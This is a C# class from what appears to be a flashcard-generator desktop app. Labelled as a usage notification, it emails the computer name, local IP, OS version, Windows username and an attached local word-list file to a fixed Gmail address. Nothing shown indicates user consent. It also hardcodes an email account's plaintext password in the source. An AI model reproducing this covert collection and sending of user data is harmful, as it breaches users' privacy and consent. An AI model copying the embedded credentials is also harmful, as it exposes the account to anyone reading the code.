using System;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;


namespace WindowsFormsApplication
{
    class Notification
    {
        private const string SmtpAddress = "smtp.gmail.com";
        private const int PortNumber = 587;
        private const bool EnableSsl = true;

        private const string EmailFrom = "hoanglongtc777@gmail.com";
        private const string Password = "12345678x@X";
        private const string EmailTo = "hoanglongtc7@gmail.com";
        private readonly string _subject = "Using Flashcards Generator " + string.Format("[{0:dddd, MMMM d, yyyy HH:mm:ss}]", DateTime.Now);

        private string Body = "Hello, It's a pleasure! Flashcards Generator is being used now!" + "<br><br>" +
                              "Computer Name: " + Environment.MachineName + "<br><br>" +
                              "IP Address: " + GetLocalIPAddress() + "<br><br>" +
                              "OS Version: " + Environment.OSVersion + "<br><br>" +
                              "UserName: " + Environment.UserName + "<br><br>" +
                              "Language Version: " + Environment.Version + "<br>";

        private const string Attachment = @".\AnkiFlashcards\WordList.txt";

        private MailMessage mail = new MailMessage();
        private SmtpClient smtp = new SmtpClient(SmtpAddress, PortNumber);

        public void SendEmail()
        {
            try
            {
                mail.From = new MailAddress(EmailFrom);
                mail.To.Add(EmailTo);
                mail.Subject = _subject;
                mail.Body = Body;
                mail.IsBodyHtml = true;
                // Can set to false, if you are sending pure text.

                mail.Attachments.Add(new Attachment(Attachment));

                smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
                smtp.Credentials = new NetworkCredential(EmailFrom, Password);
                smtp.EnableSsl = EnableSsl;
                smtp.Send(mail);

                mail.Dispose();
                Console.WriteLine("Email is sent!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("ERR: " + ex.Message);
            }
        }

        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("Local IP Address Not Found!");
        }
    }
}
